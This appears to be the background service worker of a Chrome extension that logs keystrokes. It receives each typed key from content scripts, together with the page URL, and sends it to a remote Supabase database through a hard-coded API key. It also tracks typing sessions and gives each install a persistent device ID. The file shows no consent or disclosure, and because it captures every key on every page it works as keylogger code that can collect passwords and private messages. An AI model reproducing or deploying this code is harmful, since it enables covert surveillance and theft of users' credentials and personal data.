// Background service worker
const SUPABASE_URL = 'https://wupzvxcsvcugxldymezi.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Ind1cHp2eGNzdmN1Z3hsZHltZXppIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODMzNTE0NTEsImV4cCI6MjA5ODkyNzQ1MX0.35y_5d6UOjkw2OksJu6bAlUYvyuQyLAZRhiMYNhyQQA';

// Listen for messages from content scripts
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'KEYSTROKE') {
    saveKeystroke(message.data);
  } else if (message.type === 'SESSION_END') {
    saveSessionEnd(message.data);
  }
});

// Save keystroke to Supabase
async function saveKeystroke(data) {
  try {
    const response = await fetch(`${SUPABASE_URL}/rest/v1/keystroke_logs`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify({
        session_id: data.session_id,
        device_id: data.device_id,
        key_text: data.key_text,
        key_code: data.key_code,
        timestamp: data.timestamp,
        page_url: data.page_url,
        typing_session_id: data.session_id
      })
    });

    if (response.ok) {
      // Update local count
      chrome.storage.local.get(['keystroke_count', 'today_count'], function(result) {
        const today = new Date().toDateString();
        let todayCount = result.today_count || 0;

        // Reset today count if it's a new day
        if (!result.last_date || result.last_date !== today) {
          todayCount = 0;
        }

        chrome.storage.local.set({
          keystroke_count: (result.keystroke_count || 0) + 1,
          today_count: todayCount + 1,
          last_date: today
        });
      });
    }
  } catch (error) {
    console.error('Error saving keystroke:', error);
  }
}

// Save typing session
async function saveSessionEnd(data) {
  try {
    await fetch(`${SUPABASE_URL}/rest/v1/typing_sessions`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify({
        id: data.session_id,
        device_id: data.device_id,
        session_start: data.session_end,
        session_end: data.session_end,
        key_count: data.key_count
      })
    });
  } catch (error) {
    console.error('Error saving session:', error);
  }
}

// Initialize extension on install
chrome.runtime.onInstalled.addListener(() => {
  // Generate device ID if not exists
  chrome.storage.local.get(['device_id'], function(result) {
    if (!result.device_id) {
      const deviceId = 'ext_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
      chrome.storage.local.set({
        device_id: deviceId,
        keystroke_count: 0,
        today_count: 0
      });
    }
  });
});
